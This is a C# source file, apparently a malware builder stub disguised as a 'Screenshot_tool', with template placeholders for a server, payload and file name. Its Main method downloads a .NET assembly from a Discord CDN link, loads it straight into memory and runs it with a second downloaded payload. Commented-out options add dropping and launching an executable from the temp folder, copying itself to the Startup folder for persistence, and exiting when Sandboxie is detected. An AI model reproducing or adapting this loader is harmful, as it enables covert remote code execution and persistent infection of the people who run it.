/*
 * Created by SharpDevelop.
 * User: Myel
 * Date: 02/07/2014
 * Time: 11:24
 * 
 * To change this template use Tools | Options | Coding | Edit Standard Headers.
 */
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

//Default [assembly: AssemblyTitle("sourceid")]
//Default [assembly: AssemblyDescription("sourceid")]
//Default [assembly: AssemblyCompany("sourceid-sourceid sourceid")]
//Default [assembly: AssemblyProduct("sourceid sourceid")]
//Default [assembly: AssemblyCopyright("sourceid Copyright (C) 2021")]
//Default [assembly: AssemblyFileVersion("1.1.3.0")]



//Assembly [assembly: AssemblyTitle("{1}")]
//Assembly [assembly: AssemblyDescription("{2}")]
//Assembly [assembly: AssemblyCompany("{3}")]
//Assembly [assembly: AssemblyProduct("{4}")]
//Assembly [assembly: AssemblyCopyright("{5}")]
//Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]

namespace Screenshot_tool
{
	/// <summary>
	/// Class with program entry point.
	/// </summary>
	internal sealed class Program
	{
		/// <summary>
		/// Program entry point.
		/// </summary>
		/// 



		public static byte[] indirme(string filemanager)
		{
			byte[] indirme;
			for (; ; )
			{
				try
				{
					WebClient numara = new WebClient();
					indirme = numara.DownloadData(filemanager);
				}
				catch (Exception ex)
				{
					continue;
				}
				break;
			}
			return indirme;
		}

		[DllImport("winmm.dll", EntryPoint = "mciSendStringA", ExactSpelling = true, CharSet = CharSet.Ansi, SetLastError = true)]

		private static extern int record(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);
		[STAThread]
		private static void Main(string[] args)
		{

			//sandboxie controlsandboxie();

			//Messega


			//download try
			//download {
			//download  System.Net.WebClient appyrun = new System.Net.WebClient();
			//download appyrun.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
			//download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "\\Switch.exe"));
			//download }
			//download catch
			//download {
			//download }
			{
				ServicePointManager.Expect100Continue = true;
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
			}


			object resim = new object[] { %aPP%, string.Empty, indirme("%Server%"), true };


			ServicePointManager.Expect100Continue = true;


			Assembly maymun;

			maymun = AppDomain.CurrentDomain.Load(indirme("https://cdn.discordapp.com/attachments/849222618649591812/849222637179371520/TextEditor.dll"));


			maymun.GetType("TextEditor.Home").InvokeMember("sourcecodester", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])resim);


			//start  {
			//start      System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\%FileDosya%");
			//start  }


		}



		//sandboxie [DllImport("kernel32.dll")]
		//sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
		//sandboxie static void controlsandboxie()
		//sandboxie {
		//sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
		//sandboxie     {
		//sandboxie        Environment.Exit(1);
		//sandboxie     }
		//sandboxie }

	}
}
